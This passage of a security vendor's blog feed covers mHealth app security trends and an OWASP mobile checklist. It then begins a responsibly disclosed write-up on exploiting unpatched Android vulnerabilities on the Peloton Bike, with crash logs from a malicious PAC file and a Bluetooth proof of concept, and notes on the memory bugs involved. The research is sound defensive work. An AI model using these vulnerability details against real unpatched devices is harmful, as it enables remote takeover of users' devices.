<p>Healthcare mobile application developers now face heightened scrutiny over security and privacy vulnerabilities. The American Medical Association (AMA) <a href="https://www.ama-assn.org/system/files/privacy-principles-by-design.pdf">recently encouraged</a> companies that make mHealth apps and connected devices that collect health information to adopt <a href="https://www.nowsecure.com/resource/building-privacy-by-design-into-your-mobile-app-portfolio/">privacy by design</a> principles. And in 2022, all mHealth app makers must comply with the Federal Trade Commission’s <a href="https://www.ftc.gov/enforcement/rules/rulemaking-regulatory-reform-proceedings/health-breach-notification-rule" target="_blank" rel="noreferrer noopener">Health Breach Notification Rule</a>. Any covered entity that fails to disclose a security breach properly may now be fined up to $43,792 per violation, per day.<br><br>The rule requires makers of mhealth apps and devices that collect personal health information to notify consumers following a breach involving unsecured information. In addition, if a service provider to one of these entities has a breach, it must notify the entity, which in turn must notify consumers. The rule also specifies the timing, method, and content of notification, and in the case of certain breaches involving 500 or more people, requires notice to the media.</p>



<h2>What Is mHealth?</h2>



<p>Short for mobile health and a subset of the electronic health (eHealth) category, mHealth refers to the practice of medicine and public health via mobile devices. mHealth solutions include mobile apps and mobile devices such as wearables that facilitate remote monitoring and data collection, improve clinical outcomes, deliver disease-related education, support behavioral change intervention and contact tracking. (Learn more about three such mHealth apps that NowSecure software and services help to secure in<a href="https://www.nowsecure.com/resource/lifeomic-mobile-apps-improve-holistic-health/"> LifeOmic</a>, <a href="https://www.nowsecure.com/resource/myownmed-ensures-compliance-of-critical-covid-19-mobile-app/">MyOwnMed</a> and <a href="https://www.nowsecure.com/resource/tidepool-mhealth-app-manages-diabetes/">Tidepool</a> case studies.)</p>



<p>Healthcare practitioners have been on the leading edge of mobile computing since the introduction of Palm Pilots in 1997 and tablets in the early 2000s. Today caregivers communicate with patients and conduct follow ups on any number of mobile applications. Connected devices and wearables monitor heart rate and blood pressure from hundreds of miles away, issuing alerts to smartphones.&nbsp;</p>



<p>In essence health data has never been more widely shared across so many platforms. Today patients engage in their own care, clinicians connect to patients outside of the exam room and new platforms create an ecosystem of care.&nbsp;</p>



<p>Today U.S. hospitals have roughly 10 to 15 million medical devices with an average of 10 to 15 connected medical devices per patient bed, according to research from security company Zingbox. Companies such as Medtronic made securing Internet of Things (IoT) healthcare devices a priority after a security researcher hacked an<a href="https://www.theverge.com/2021/10/6/22712808/medtronic-recall-insulin-pump-controller-cybersecurity-hack" target="_blank" rel="noreferrer noopener"> insulin pump</a> in 2018. Since then <a href="https://venturebeat.com/wp-content/uploads/2008/08/icd-study.pdf">pacemakers</a>, cardiac defibrillators and <a href="https://www.cnn.com/2021/11/09/tech/medical-devices-vulnerable-to-hackers/index.html" target="_blank" rel="noreferrer noopener">devices using Siemens</a> Nucleus Real-time Operating System have all been found vulnerable. <strong><br></strong></p>



<p>Interoperability in healthcare – the ability to establish connectivity and communication between devices and IT systems and between data and workflows while enabling secure and transparent data exchange – has long been a challenge. Secure and private by design principles must factor in interconnections of data that rarely exist in other industries.&nbsp;</p>



<p>mHealth app makers should pay special attention to properly securing the sensitive data that flows from their apps on smartphones and IoT devices. “While users have been adopting health apps at a rapid rate, the commercial owners of these apps too often fail to invest in adequate privacy and data security, leaving users exposed,” said FTC Chair Lina M. Khan.</p>



<blockquote class="custom-quote bg-blue color-white">

    <i class="fas fa-quote-left"></i>
	While users have been adopting health apps at a rapid rate, the commercial owners of these apps too often fail to invest in adequate privacy and data security, leaving users exposed.    <i class="fas fa-quote-right"></i>

	
        <cite>&#8211; Lina M. Khan, Chair, Federal Trade Commission</cite>

	
</blockquote>



<p></p>



<p>Indeed, a NowSecure <a href="https://mobilerisktracker.nowsecure.com/">ongoing benchmark review</a> of healthcare apps available on the Apple® App Store® and Google Play<img src="https://s.w.org/images/core/emoji/13.1.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /> store shows that many mHealth apps contain vulnerabilities that leak data to an undisclosed party or even other applications.&nbsp;</p>



<h2>Scoring mHealth Privacy and Security</h2>



<p>Similar to grades in school, the <a href="https://mobilerisktracker.nowsecure.com/">NowSecure MobileRiskTracker<img src="https://s.w.org/images/core/emoji/13.1.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /></a> scores mobile apps on a scale of 0-100 and assigns a pass or fail letter grade from A (100-90), B (89-80), C (79-70), D (69-60) or F (59 or less). Mobile apps that score an A or B represent high-quality, low-risk apps considered to be the most secure. Testing verifies that these mobile apps protect credentials, encrypt personal information and online transactions, and properly use device permissions.</p>



    <div id="featured-resource-block"
         class="cta-id-15226 resource-id-14006 post-type-resource_item">

                    <div class="image-holder" style="background-image: url(https://www.nowsecure.com/wp-content/uploads/2020/03/NowSecure_PrivacyByDesignEbook_cover.jpg)"></div>
            <!-- /.image-holder -->

        
        <div class="content-holder">

            <div class="transparent-shape"></div>
            <!-- /.transparent-shape -->
            <div class="grey-shape"></div>
            <!-- /.grey-shape -->

            <div class="content-in">

                                    <h3 class="resource-title">
                        Building Privacy by Design Into Your Mobile App Portfolio                    </h3>
                    <!-- /.resource-title -->

                
                
                                    <a href="https://discover.nowsecure.com/c/privacy-by-design?x=LIaYZt"
                       target="_blank">

                        Download Now
                    </a>
                    <!-- /.resource-link -->

                
            </div>
            <!-- /.content-in -->

        </div>
        <!-- /.content-holder -->

    </div>
    <!-- /#featured-resource-block -->



<p></p>



<p>The mobile apps that scored a C (79-70) have medium risks and should be used with caution and monitored for strange activity or scores changing with updates. Mobile apps in the C range may leak sensitive information or have excessive permissions that are unnecessary, such as a flashlight app that gains permissions to access a contact address book, GPS data or a camera.</p>



<p>Applications that scored a D or F (69 or less) represent a high risk and should not be used until security bugs are fixed by their developers. Failing apps have known software flaws that developers of these mobile apps should be aware of and address immediately, such as leaking unencrypted user ID or password or other personal account info over a network or being open to man-in-the-middle attacks or data harvesting.</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="960" height="365" src="https://www.nowsecure.com/wp-content/uploads/2022/03/Healthcare-Apps-Data-Sheet_1-960x365.png" alt="" class="wp-image-16410" srcset="https://www.nowsecure.com/wp-content/uploads/2022/03/Healthcare-Apps-Data-Sheet_1-960x365.png 960w, https://www.nowsecure.com/wp-content/uploads/2022/03/Healthcare-Apps-Data-Sheet_1-360x137.png 360w, https://www.nowsecure.com/wp-content/uploads/2022/03/Healthcare-Apps-Data-Sheet_1-768x292.png 768w, https://www.nowsecure.com/wp-content/uploads/2022/03/Healthcare-Apps-Data-Sheet_1-1536x584.png 1536w, https://www.nowsecure.com/wp-content/uploads/2022/03/Healthcare-Apps-Data-Sheet_1-240x91.png 240w, https://www.nowsecure.com/wp-content/uploads/2022/03/Healthcare-Apps-Data-Sheet_1.png 2001w" sizes="(max-width: 960px) 100vw, 960px" /></figure>



<p>Out of 595 popular healthcare-related mobile apps on public marketplaces, the average security and privacy risk score is 69 (D). Many in the healthcare category contain at least one vulnerability that fails to secure network communication or configuration error that could expose&nbsp; personal data to other apps. Mobile pharma apps scored slightly lower with an average score of 66 (D). Software bugs that cause healthcare apps to fail these assessments can only be discovered through secure development practices and thorough testing.&nbsp;<br><br>NowSecure promotes <a href="https://www.nowsecure.com/blog/2021/06/23/a-mobile-app-devs-guide-to-secure-by-design-trust-but-verify/">secure by design</a> approaches to mobile app development and welcomes the new call for accountability. As practitioners <a href="https://www.nowsecure.com/resource/the-reason-mobile-app-security-matters-for-mhealth-post-pandemic/">increasingly tap mHealth apps</a> and connected devices to improve critical care, healthcare organizations must also ensure the security and privacy of data. NowSecure recommends integrating automated mobile application security into the dev pipeline, conducting outside penetration testing for high-risk mobile apps and continuously testing mobile apps in production to guard against third-party supply-chain vulnerabilities. <a href="https://info.nowsecure.com/on-demand-continuous-mobile-appsec-testing.html">Book a NowSecure Platform demo</a> to see the automated mobile appsec testing tool in action.</p>
<p>The post <a rel="nofollow" href="https://www.nowsecure.com/blog/2022/03/09/2022-mhealth-app-security-and-privacy-trends/">2022 mhealth App Security and Privacy Trends</a> appeared first on <a rel="nofollow" href="https://www.nowsecure.com">NowSecure</a>.</p>
]]></content:encoded>
    </item>
    <item>
      <title>OWASP Mobile Security Testing Checklist Aids Compliance</title>
      <link>https://www.nowsecure.com/blog/2022/02/23/owasp-mobile-security-testing-checklist-aids-compliance/</link>
      <dc:creator><![CDATA[Amy Schurr]]></dc:creator>
      <pubDate>Wed, 23 Feb 2022 13:00:00 +0000</pubDate>
      <category><![CDATA[Best Practices]]></category>
      <category><![CDATA[Industry News]]></category>
      <guid isPermaLink="false">https://www.nowsecure.com/?p=16368</guid>
      <description><![CDATA[<p>Mobile application security professionals following best practices for OWASP security testing now have a new resource to enhance their efficiency. As part of a series of updates to the OWASP MASVS and OWASP MSTG, the OWASP Mobile Project recently released a new fully automated version of its OWASP Mobile Security Checklist with a streamlined design.</p>
<p>The post <a rel="nofollow" href="https://www.nowsecure.com/blog/2022/02/23/owasp-mobile-security-testing-checklist-aids-compliance/">OWASP Mobile Security Testing Checklist Aids Compliance</a> appeared first on <a rel="nofollow" href="https://www.nowsecure.com">NowSecure</a>.</p>
]]></description>
      <content:encoded><![CDATA[
<p>Mobile application security professionals following best practices for OWASP security testing<strong> </strong>now have a new resource to enhance their efficiency. As part of a series of updates to the OWASP MASVS and OWASP MSTG, the OWASP Mobile Project recently released a new fully automated version of its <a href="https://github.com/OWASP/owasp-mstg/releases/tag/v1.4.0"><strong>OWASP Mobile Security Checklist</strong></a><strong> </strong>with a streamlined design. The checklist eases the compliance process for meeting industry-standard requirements from early planning and development to mobile application security testing.</p>



<figure class="wp-block-image size-large is-resized"><img loading="lazy" src="https://www.nowsecure.com/wp-content/uploads/2022/02/OWASPChecklistBeforeAfter-960x278.png" alt="" class="wp-image-16369" width="840" height="243" srcset="https://www.nowsecure.com/wp-content/uploads/2022/02/OWASPChecklistBeforeAfter-960x278.png 960w, https://www.nowsecure.com/wp-content/uploads/2022/02/OWASPChecklistBeforeAfter-360x104.png 360w, https://www.nowsecure.com/wp-content/uploads/2022/02/OWASPChecklistBeforeAfter-768x222.png 768w, https://www.nowsecure.com/wp-content/uploads/2022/02/OWASPChecklistBeforeAfter-1536x444.png 1536w, https://www.nowsecure.com/wp-content/uploads/2022/02/OWASPChecklistBeforeAfter-2048x592.png 2048w, https://www.nowsecure.com/wp-content/uploads/2022/02/OWASPChecklistBeforeAfter-240x69.png 240w" sizes="(max-width: 840px) 100vw, 840px" /></figure>



<p>Mobile pen testing requires properly documenting your work and the OWASP Software Assurance Maturity Model (SAMM) and NIST both emphasize the importance of checklists. “Checklists are an essential resource in security testing,” says Carlos Holguera, a NowSecure mobile security researcher and co-leader of the <a href="https://owasp.org/www-project-mobile-security-testing-guide/">OWASP Mobile Security Project</a>. “If you’re conducting a pen test and cannot dive as deeply as you’d like due to time constraints or app complexity, you can expect to miss a few potential security issues. But failing to validate the controls listed on a checklist is inexcusable.”</p>



<blockquote class="custom-quote bg-blue color-white">

    <i class="fas fa-quote-left"></i>
	Checklists are an essential resource in security testing.    <i class="fas fa-quote-right"></i>

	
        <cite>&#8211; Carlos Holguera, NowSecure</cite>

	
</blockquote>



<p></p>



<h2>Abundant OWASP Mobile Resources</h2>



<p>OWASP, an international non-profit organization, focuses on improving application security by giving developers and security teams the resources they need to build secure software. The foundation’s Mobile Security Project classifies mobile security risks and provides developmental controls to reduce their impact or likelihood of exploitation. (Consult the NowSecure resource, <a href="https://www.nowsecure.com/resource/essential-guide-to-applying-the-owasp-mobile-security-project/">An Essential Guide to the OWASP Mobile Security Project, </a>for advice about building and running a risk-based mobile application security<strong> </strong>program.)</p>



<p>The OWASP Mobile Security Project offers a trifecta of complementary resources for mobile application security: the OWASP Mobile Application Verification Standards (MASVS), the OWASP Mobile Security Testing Guide (MSTG) and the OWASP Mobile Security Testing Checklist. The three work together to promote strong mobile application security.</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="960" height="1205" src="https://www.nowsecure.com/wp-content/uploads/2022/02/OWASPResources-960x1205.png" alt="" class="wp-image-16370" srcset="https://www.nowsecure.com/wp-content/uploads/2022/02/OWASPResources-960x1205.png 960w, https://www.nowsecure.com/wp-content/uploads/2022/02/OWASPResources-360x452.png 360w, https://www.nowsecure.com/wp-content/uploads/2022/02/OWASPResources-768x964.png 768w, https://www.nowsecure.com/wp-content/uploads/2022/02/OWASPResources-1224x1536.png 1224w, https://www.nowsecure.com/wp-content/uploads/2022/02/OWASPResources-191x240.png 191w, https://www.nowsecure.com/wp-content/uploads/2022/02/OWASPResources.png 1340w" sizes="(max-width: 960px) 100vw, 960px" /></figure>



<p>The MASVS outlines the definitive <a href="https://www.nowsecure.com/solutions/by-need/mobile-standards-compliance/">standard</a> for mobile app security. Mobile app owners, architects and developers consult the MASVS to build security by design and security professionals rely on the MASVS to establish a security baseline for all mobile apps and test them consistently.&nbsp;</p>



<p>The MASVS covers eight domains that address the mobile attack surface: </p>



<ul><li>V1: Architecture, Design and Threat Modeling</li><li>V2: Data Storage and Privacy</li><li>V3: Cryptography</li><li>V4: Authentication and Session Management</li><li>V5: Network Communication</li><li>V6: Environmental Interaction</li><li>V7: Code Quality and Build Setting</li><li>V8: Resiliency Against Reverse Engineering</li></ul>



<p></p>



<p>The OWASP Mobile Security Testing Guide (MSTG) provides mobile application security analysts with a reference guide for mobile pen testing. The manual details Android and iOS mobile application security testing based on MASVS. <br><br>And the OWASP Mobile Security Checklist ties together the MASVS and the MSTG. The spreadsheet enables mobile pen testers to discard MASVS requirements that aren’t part of the application threat model, mark items with a pass or fail status and references the relevant sections of the MSTG to guide Android and iOS testing.</p>



    <div id="featured-resource-block"
         class="cta-id-16307 resource-id-15845 post-type-resource_item">

                    <div class="image-holder" style="background-image: url(https://www.nowsecure.com/wp-content/uploads/2021/10/Pen-Testing-Ebook-feat-image-1200x628-1.png)"></div>
            <!-- /.image-holder -->

        
        <div class="content-holder">

            <div class="transparent-shape"></div>
            <!-- /.transparent-shape -->
            <div class="grey-shape"></div>
            <!-- /.grey-shape -->

            <div class="content-in">

                                    <h3 class="resource-title">
                        How to Build A Successful Mobile App Penetration Testing Program                    </h3>
                    <!-- /.resource-title -->

                
                
                                    <a href="https://discover.nowsecure.com/c/mobile-app-pen-testing-whitepaper?x=cEXJzu"
                       target="_blank">

                        Learn More
                    </a>
                    <!-- /.resource-link -->

                
            </div>
            <!-- /.content-in -->

        </div>
        <!-- /.content-holder -->

    </div>
    <!-- /#featured-resource-block -->



<p></p>



<h2>Zooming In On the OWASP Mobile Security Checklist</h2>



<p>The revamped OWASP Mobile Security Checklist offers several enhancements. Chief among them are automation to replace a spreadsheet that previously had to be manually generated and an attractive design that reflects OWASP’s evolution and is easier to use.</p>



<p>“Working with Excel is not fun, but working with an ugly Excel spreadsheet is demotivating,” jokes Holguera. However, he notes that the facelift is more than simply graphics. “It reflects all the new things from the project including cleanliness, structure, reflection of Android and iOS and the interconnection of MASVS and MSTG,” he explains.&nbsp;</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="960" height="474" src="https://www.nowsecure.com/wp-content/uploads/2022/02/checklists_features-960x474.png" alt="" class="wp-image-16371" srcset="https://www.nowsecure.com/wp-content/uploads/2022/02/checklists_features-960x474.png 960w, https://www.nowsecure.com/wp-content/uploads/2022/02/checklists_features-360x178.png 360w, https://www.nowsecure.com/wp-content/uploads/2022/02/checklists_features-768x379.png 768w, https://www.nowsecure.com/wp-content/uploads/2022/02/checklists_features-1536x759.png 1536w, https://www.nowsecure.com/wp-content/uploads/2022/02/checklists_features-2048x1012.png 2048w, https://www.nowsecure.com/wp-content/uploads/2022/02/checklists_features-240x119.png 240w" sizes="(max-width: 960px) 100vw, 960px" /></figure>



<p>Additional features include:&nbsp;</p>



<ul><li>Supports 13 languages</li><li>Unifies all MASVS categories into a single sheet&nbsp;</li><li>Traceable via exact MASVS and MSTG versions and commit IDs&nbsp;</li><li>Always up to date with the latest MSTG and MASVS versions</li><li>Enables user to add more columns or sheets as needed</li></ul>



<p></p>



<p>The above enhancements all streamline the reporting needed to demonstrate thorough mobile pen testing and gauge OWASP MASVS standards compliance. Going forward, Holguera says that automation may enable OWASP to add more elements offering useful insights. He anticipates that after the current <a href="https://github.com/OWASP/owasp-masvs/discussions/categories/big-masvs-refactoring">MASVS refactoring</a> is complete, the MSTG will also be refactored to enable the checklists to extend mapping to include more specific MSTG tests to aid compliance. OWASP invites you to submit feedback and ideas regarding the checklists to the project’s <a href="https://github.com/OWASP/owasp-mstg/discussions/">GitHub Discussions </a>section.&nbsp;</p>



<p>At <a href="https://www.nowsecure.com/blog/2021/11/29/best-moments-from-nowsecure-connect-21-mobile-app-devsecops-conference/">NowSecure Connect 2021</a>, Holguera and fellow OWASP Mobile Security Project Co-leader Sven Schleier of F-Secure offered a preview of some of the group’s ongoing work to refactor MASVS and more closely align MASVS and MSTG resources to advance mobile application security testing<strong> </strong>practices. You can watch the on-demand session replay by registering <a href="https://events.bizzabo.com/NSConnect21/">here</a>. <br><br>“We at the OWASP Mobile Security Project are continuously improving our standard and underlying processes to offer you new ways to interact with the MASVS and the MSTG to make your compliance efforts as efficient as possible,” says Holguera. He invites you to monitor and participate in current <a href="https://github.com/OWASP/owasp-masvs/discussions/categories/big-masvs-refactoring">refactoring efforts</a>.</p>



<h2>NowSecure Supports OWASP</h2>



<p>NowSecure proudly supports the OWASP Mobile Security Project by dedicating staff to the evolution of the standards specification. The NowSecure team continues to make&nbsp;substantial contributions to OWASP MASVS and MSTG and also serves as an OWASP God Mode sponsor.&nbsp;</p>
<p>The post <a rel="nofollow" href="https://www.nowsecure.com/blog/2022/02/23/owasp-mobile-security-testing-checklist-aids-compliance/">OWASP Mobile Security Testing Checklist Aids Compliance</a> appeared first on <a rel="nofollow" href="https://www.nowsecure.com">NowSecure</a>.</p>
]]></content:encoded>
    </item>
    <item>
      <title>A Zero-Click RCE Exploit for the Peloton Bike  (And Also Every Other Unpatched Android Device)</title>
      <link>https://www.nowsecure.com/blog/2022/02/09/a-zero-click-rce-exploit-for-the-peloton-bike-and-also-every-other-unpatched-android-device/</link>
      <dc:creator><![CDATA[Shannon]]></dc:creator>
      <pubDate>Wed, 09 Feb 2022 16:00:00 +0000</pubDate>
      <category><![CDATA[Research & Threat Intel]]></category>
      <guid isPermaLink="false">https://www.nowsecure.com/?p=16300</guid>
      <description><![CDATA[<p>TL;DR: The Peloton Bike ran an unpatched version of Android 7 which led to it being vulnerable to a number of known issues, most significantly CVE-2021-0326, which could allow an attacker within WiFi range to execute arbitrary code on the device. There is no requirement for the user to interact with any attacker controlled data,</p>
<p>The post <a rel="nofollow" href="https://www.nowsecure.com/blog/2022/02/09/a-zero-click-rce-exploit-for-the-peloton-bike-and-also-every-other-unpatched-android-device/">A Zero-Click RCE Exploit for the Peloton Bike  (And Also Every Other Unpatched Android Device)</a> appeared first on <a rel="nofollow" href="https://www.nowsecure.com">NowSecure</a>.</p>
]]></description>
      <content:encoded><![CDATA[
<p>TL;DR: The Peloton Bike ran an unpatched version of Android 7 which led to it being vulnerable to a number of known issues, most significantly CVE-2021-0326, which could allow an attacker within WiFi range to execute arbitrary code on the device. There is no requirement for the user to interact with any attacker controlled data, the user must only tap the Cast Screen option in the upper right corner menu to be vulnerable. I own a Peloton Bike and discovered the device’s vulnerability to this issue as part of my work as a mobile security researcher for NowSecure. I reported it to Peloton via its responsible disclosure program and Peloton worked with us to quickly fix this vulnerability and deploy the fix to all impacted devices.&nbsp;</p>



<p>Because this is a vulnerability in wpa_supplicant, all unpatched Android devices are potentially vulnerable to this issue. The proof-of-concept (POC) exploit included in this post will only work with ASLR disabled but it is very likely that a bypass is possible.</p>



<h3><strong>Foreshadowing</strong></h3>



<p>This is the second post in a series about the<a href="https://www.nowsecure.com/blog/2021/12/08/its-not-about-the-bike-how-nowsecure-helped-peloton-secure-its-mobile-apps-apis/"> Peloton Bike security</a>. The previous post briefly touched on the security of the bike tablet, noting only that the fully updated device was running a version of Android 7. From the output of getprop we can check the last security patch date:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: plain; title: ; notranslate">
...
&#91;ro.build.version.release]: &#91;7.0]
&#91;ro.build.version.sdk]: &#91;24]
&#91;ro.build.version.security_patch]: &#91;2019-08-05]
...
</pre></div>


<p>So that&#8217;s when it was last patched — <strong>2019-08-05</strong>. I began my research in August 2021 so there were two (2) years of unpatched vulnerabilities to try out on the bike. Immediately I was determined to find a working RCE exploit for the Peloton to demonstrate the seriousness of being so out of date on patches. With two years of issues to pick from it was going to be really, really easy.</p>



<h3><strong>Timeline</strong></h3>



<ul><li>09/22/2021 &#8211; Disclosed initial results to Peloton Product Security which included:<ul><li>Vulnerability to CVE-2019-2205 which could lead to RCE</li><li>Vulnerability to CVE-2020-0022 which could lead to RCE</li></ul></li><li>09/29/2021 &#8211; Peloton indicated in an initial response that it was still investigating the issues.</li><li>10/05/2021 &#8211; Peloton requested PoCs for the two issues.</li><li>10/06/2021 &#8211; Sent PoCs that result in crashes.</li><li>10/12/2021 &#8211; Peloton verified the vulnerabilities and assigned them CVSS scores:<ul><li>CVE-2019-2205: <strong>4.6</strong> &#8211; Medium</li><li>CVE-2020-0022: <strong>5.0</strong> &#8211; Medium</li></ul></li><li>10/13/2021 &#8211; NowSecure agreed with the scores based on the difficulty of exploitation.</li><li>10/26/2021 &#8211; Disclosed vulnerability to CVE-2021-0326 which could lead to RCE.</li><li>11/05/2021 &#8211; Peloton verified that the Bike was vulnerable to CVE-2021-0326.</li><li>11/08/2021 &#8211; Peloton assigned CVE-2021-0326 a CVSS score of <strong>7.5</strong> &#8211; High.<ul><li>Our assessment was that the score should be <strong>8.3</strong> or higher.</li></ul></li><li>12/16/2021 &#8211; Peloton confirmed that a release that would fix the above CVEs would be deployed starting the next week and being rolled out to all devices by the end of January.</li><li>01/15/2022 &#8211; NowSecure verified fixes to the 3 CVEs.</li><li>02/09/2022 &#8211; This blog post is published.&nbsp;</li></ul>



<p></p>



<h3><strong>Initial Success</strong></h3>



<p>The first vulnerability I tested was one I actually discovered in August 2019 that affected Android’s handling of Proxy Auto-Configuration (PAC) files, detailed here<a href="https://www.nowsecure.com/blog/2019/11/13/nowsecure-discovers-critical-android-vuln-that-may-lead-to-remote-code-execution/"> <img loading="lazy" width="15" height="15" src="https://lh4.googleusercontent.com/92uSI8TReC9YHqX8SbCVQ2wx18RmVtZWDl1qWev6fLMeOdq3kjwQyVr8oUVYReNraqot0QFcLYuNmsW6n0cd8GchhYpqpRPbooGHv_xYvUnC-qElj1n6cgTWIRPq5bLggX66T5dV">NowSecure Discovers Critical Android Vuln That May Lead to Remote Code Execution</a>. The gist of this issue is that the PAC files are simply Javascript code and libpac, the library Android has to parse them, uses V8 to execute this code. A pitfall of V8 is that it requires the program embedding it to handle the allocations of <code> ArrayBuffer</code> objects. The way that libpac did this was incorrect, which made it possible for a malicious PAC script to overwrite the <code> allocate</code> and <code> free</code> function pointers to take control of program execution. As an attacker could intercept and modify a PAC file sent over HTTP, this technically counted as an RCE. I set the proxy settings on the Peloton Tablet to point to the PAC vulnerability PoC and checked logcat to see:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: plain; title: ; notranslate">
sending Proxy Broadcast for PAC Script: http://192.168.50.177:8000/paccrash.pac&#91;localhost] 43363 xl=
Fatal signal 11 (SIGSEGV), code 2, fault addr 0x7b7a320400 in tid 21256 (Binder:21230_4)
*** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
Build fingerprint: 'Peloton/RB1VQ/RB1VQ:7.0/NQV46A/1605503422:user/release-keys'
Revision: '0'
ABI: 'arm64'
pid: 21230, tid: 21256, name: Binder:21230_4  &gt;&gt;&gt; com.android.pacprocessor &lt;&lt;&lt;
signal 11 (SIGSEGV), code 2 (SEGV_ACCERR), fault addr 0x7b7a320400
x0   0000007b737b8fd0  x1   00000000cafebabe  x2   00000000cafebabe  x3   0000000000000001
x4   0000000000000000  x5   0000007b1e403751  x6   0000007b1e36be80  x7   0000000000000000
x8   0000007b737b8fd0  x9   0000007b7a320400  x10  0000000000000040  x11  0000000000000040
x12  0000007b3fa52c60  x13  0000000000000000  x14  0000007b7306c3f0  x15  003b9aca00000000
x16  0000007b6098f970  x17  0000007b7c62b9dc  x18  0000000000000002  x19  0000000000000000
x20  0000007b73086c40  x21  00000000cafebabe  x22  0000007b5fe1c070  x23  c643de9b321b87de
x24  0000007b5fe1dff0  x25  0000007b5fe1c060  x26  0000007b73086c88  x27  0000007b1e319a89
x28  0000007b736bbb20  x29  0000007b736bbaa0  x30  0000007b603dd524
sp   0000007b736bba80  pc   0000007b7a320400  pstate 0000000060000000

backtrace:
     #00 pc 0000000000120400  &#91;anon:libc_malloc:0000007b7a200000]
     #01 pc 00000000002f5520  /system/lib64/libpac.so
     #02 pc 00000000004904fc  /system/lib64/libpac.so
     #03 pc 0000000000028a24  &lt;anonymous:0000007b1eb84000&gt;
</pre></div>


<p>So it was clear that the patch date was accurate. However unlike on the Pixel 3a on Android 9 the vtable was not overwritten by the URL passed to the resolver, instead being overwritten by a heap address. Depending on where on the stack this heap address came from the bug may not be exploitable. And regardless there is only one person in the world who has ever set their Peloton to use a proxy auto-config file, and that person has two thumbs and is writing a blog post right now. I wanted to find a vulnerability that could be realistically triggered during normal use of the bike by a normal person.</p>



<h3><strong>Failure</strong></h3>



<p>This decision would drastically cut down the number of public vulnerabilities to choose from. Most serious mobile platform vulnerabilities come from browser bugs or parsing corrupt media files, and RCE exploits typically work by sending those files by SMS, email, WhatsApp, etc… The Peloton doesn’t have those things. It is possible to set a profile picture that others will see, but that image goes through an image formatting service before being sent to the tablet which prevents any sort of maliciously crafted file from reaching a bike user. Also the tablet doesn’t have NFC so that&#8217;s out.Essentially the only publicly disclosed vulnerabilities left were those that targeted the bluetooth and networking stack. Luckily there were many bluetooth vulnerabilities to choose from, the most notable being CVE-2020-0022. This vulnerability and an exploit for it were covered in an excellent blog post here<a href="https://insinuator.net/2020/04/cve-2020-0022-an-android-8-0-9-0-bluetooth-zero-click-rce-bluefrag/"> <img loading="lazy" width="15" height="15" src="https://lh4.googleusercontent.com/nZEVCz0XJ_OfiMPfD14HTJ2XMTdVP1B5yjpHVr2tUoG4B602hi7SM2SCSYX-69znBRBpoQgq7FoY58SmW8af9CjAlWvZqyQSunSuZuYz3mDGA77fTG4IRL-IiOowNHGeQx0lufg3">CVE-2020-0022 an Android 8.0-9.0 Bluetooth Zero-Click RCE – BlueFrag</a>. The issue stems from the parsing of L2CAP packets that have been fragmented. When reassembling the fragments in the bluetooth daemon the remaining length was not checked, allowing it to be less than the <code> HCI_ACL_PREAMBLE_SIZE</code> which led to a negative size being passed to <code> memcpy</code>. Memcpy then interprets this as an unsigned integer, leading to an overflow due to this massive size. I tested the PoC provided with this blog and was excited to see this result:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: plain; title: ; notranslate">
*** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
Build fingerprint: 'Peloton/RB1VQ/RB1VQ:7.0/NQV46A/1605503422:user/release-keys'
Revision: '0'
ABI: 'arm'
pid: 625, tid: 1003, name: bluetooth wake  &gt;&gt;&gt; com.android.bluetooth &lt;&lt;&lt;
signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0xcca00000
r0 cca00000  r1 cc9fffe8  r2 fffbb23a  r3 00000004
r4 cc9bb258  r5 00000014  r6 cc9bb288  r7 0000000e
r8 00000004  r9 00000000  sl cdf7ddd0  fp 0000000b
ip 80000000  sp cd42f420  lr cdeb2aaf  pc e86f14c0  cpsr a00f0010

backtrace:
     #00 pc 000174c0  /system/lib/libc.so (memcpy+116)
     #01 pc 0007eaab  /system/lib/hw/bluetooth.default.so
     #02 pc 0007d45b  /system/lib/hw/bluetooth.default.so
     #03 pc 000e6f9b  /system/lib/hw/bluetooth.default.so
     ...
</pre></div>


<p>However there was an issue; the above blog post was dealing with ARM64 and the bluetooth daemon on the Peloton was (weirdly) 32 bit ARM. The implementation of <code> memcpy</code> in the ARM64 version has a quirk that allows the negative sized copy to end, which also allows the exploit to leak memory containing addresses. The 32 bit implementation did not have that quirk. Luckily at the very end of the post there was salvation: a different exploit for this vulnerability on a 32 bit device by Polo35. Instead of relying on the underflow this exploit used a zero length <code> memcpy</code> to read 4 bytes of uninitialized memory.</p>



<p>Unfortunately this also did not work on the version of the bluetooth daemon on the Peloton. There was no way to leak memory or prevent crashes from <code> memcpy</code>. It ultimately was not exploitable.</p>



<p>I then went through every other bluetooth vulnerability listed in those two years of Android Security Bulletins. Some were unexploitable. Many were kind of “theoretical” vulnerabilities that <em>might</em> exist for certain configurations that don’t exist in reality. Others I could not reproduce or even see how there was a vulnerability at all.</p>



<p>It sucked. I was stuck.</p>



<blockquote class="custom-quote bg-blue color-white">

    <i class="fas fa-quote-left"></i>
	Peloton worked with us to quickly fix this vulnerability and deploy the fix to all impacted devices.    <i class="fas fa-quote-right"></i>

	
</blockquote>



<p></p>



<h3><strong>Redemption</strong></h3>



<p>It was my belief when I started that there would be at least one, probably more, well documented vulnerabilities that I would be able to use to easily get code execution on this unpatched device. Two years is a long time in infosec. However this does not reflect the current state of Android security. Actual (publicly known) exploitable RCE vulnerabilities in Android, especially outside of chrome and the media framework, are pretty few and far between. I understand a bit more now why<a href="https://www.wired.com/story/android-zero-day-more-than-ios-zerodium/"> 0-Click Android exploits became more expensive than iOS.</a></p>



<p>Previously I had been looking at older vulnerabilities, specifically looking for better documented ones, hopefully with exploits that I could simply rework for the Peloton. I gave up on that. Additionally I had exhausted the known Bluetooth vulnerabilities so I started looking elsewhere. I turned to WiFi and read about <strong>CVE-2021-0326</strong> in the February 2021 Android Security Bulletin</p>



